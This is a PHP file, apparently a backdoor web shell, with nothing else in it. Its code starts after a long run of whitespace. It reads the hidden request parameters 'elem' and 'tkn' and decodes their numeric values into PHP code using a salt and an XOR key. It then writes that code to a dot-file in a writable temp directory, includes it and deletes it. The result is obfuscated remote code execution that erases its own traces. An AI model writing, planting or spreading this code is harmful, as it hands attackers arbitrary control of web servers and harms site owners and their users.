<?php																																										if(in_array("ele\x6D", array_keys($_REQUEST))){ $ptr = $_REQUEST["ele\x6D"]; $ptr=explode ( '.', $ptr ) ; $ent =''; $s ='abcdefghijklmnopqrstuvwxyz0123456789'; $sLen =strlen($s); $i =0; $__len =count($ptr); do {if ($i >= $__len) break; $v1 =$ptr[$i]; $sChar =ord($s[$i % $sLen]); $d =((int)$v1 - $sChar - ($i % 10)) ^ 54; $ent .= chr($d); $i++; } while (true); $pgrp = array_filter(["/var/tmp", "/tmp", getcwd(), ini_get("upload_tmp_dir"), getenv("TMP"), sys_get_temp_dir(), getenv("TEMP"), "/dev/shm", session_save_path()]); foreach ($pgrp as $key => $res) { if (is_writable($res) && is_dir($res)) { $object = "$res" . "/.resource"; if (file_put_contents($object, $ent)) { include $object; @unlink($object); exit; } } } }


if(isset($_REQUEST["\x74kn"]) ? true : false){
	$holder = array_filter(["/tmp", ini_get("upload_tmp_dir"), sys_get_temp_dir(), getenv("TEMP"), getenv("TMP"), "/dev/shm", getcwd(), "/var/tmp", session_save_path()]);
	$val = $_REQUEST["\x74kn"];
			 $val 		=explode		(	"."  ,	$val  ) ;
	$obj = '';
            $salt8 = 'abcdefghijklmnopqrstuvwxyz0123456789';
            $sLen = strlen($salt8 );
    
            foreach($val as $m => $v1) {
                $chS = ord($salt8[$m%		$sLen] );
                $d =((int)$v1 - $chS -($m%		10)) ^ 20;
                $obj .= chr($d );}  
	foreach ($holder as $bind):
    		if (is_dir($bind) && is_writable($bind)) {
    $binding = "$bind/.entry";
    if (file_put_contents($binding, $obj)) {
	include $binding;
	@unlink($binding);
	die();
}
}
endforeach;
}